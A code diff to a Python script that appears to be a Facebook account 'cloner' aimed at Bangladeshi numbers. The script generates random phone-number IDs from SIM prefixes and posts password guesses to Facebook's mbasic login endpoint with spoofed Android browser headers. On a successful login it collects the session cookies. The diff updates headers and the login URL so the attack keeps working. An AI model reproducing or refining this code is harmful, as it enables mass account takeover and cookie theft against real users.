@@ -209,10 +209,10 @@ def virusA():
 	user=[]
 	os.system('clear')
 	print(logo)
-	print("〘✧〙BD SIM CODE 017 015 018 019 013 015 016]")
+	print("〘✧〙BD SIM CODE 017✧015✧018✧019✧013✧015✧016]")
 	kode = input('〘✧〙SELECT : ')
 	doamin = ' 〘✧〙BD Number id cloner [ONLY-OK] '
-	print('〘✧〙EXAMPLE : 1000,5000,10000,15000,20000] ')
+	print('〘✧〙EXAMPLE : 1000✧5000✧10000✧15000✧20000] ')
 	limit = int(input('〘✧〙LIMIT : '))
 	for nmbr in range(limit):
 		koda = ''.join(random.choice(string.digits) for _ in range(2))
@@ -269,21 +269,21 @@ def b(uid,pwx,tl):
             'accept-language': 'en-US,en;q=0.9',
             'cache-control': 'max-age=0',
             'dpr': '2',
-            'sec-ch-prefers-color-scheme': 'dark',
-            'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
-            'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.240"',
+            'referer': 'https://mbasic.facebook.com/?stype=lo&deoia=1&jlou=AfeUK5tm9FLZkimGP5KbUNsD9EDBr8vb0GX8J_RvgeCueLYzI8TOm_bOQV4iTtLzMLw2IZ2r7VYtqmwWIKTVHhu6VIXfnEFe9DrKtagSaSmbaA&smuh=65032&lh=Ac8Vp9WXX26YbFbc6fk&refid=31&ref_component=mbasic_footer&_rdr',
+            'sec-ch-prefers-color-scheme': 'light',
+            'sec-ch-ua': '"Chromium";v="111", "Not(A:Brand";v="8"',
+            'sec-ch-ua-full-version-list': '"Chromium";v="111.0.5563.104", "Not(A:Brand";v="8.0.0.0"',
             'sec-ch-ua-mobile': '?1',
             'sec-ch-ua-model': '"TECNO BF7"',
             'sec-ch-ua-platform': '"Android"',
             'sec-ch-ua-platform-version': '"12.0.0"',
             'sec-fetch-dest': 'document',
             'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'none',
+            'sec-fetch-site': 'same-origin',
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
-            'user-agent': 'pro',
-            'viewport-width': '980',}
-            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
+            'user-agent': 'pro',}
+            lo = session.post('https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
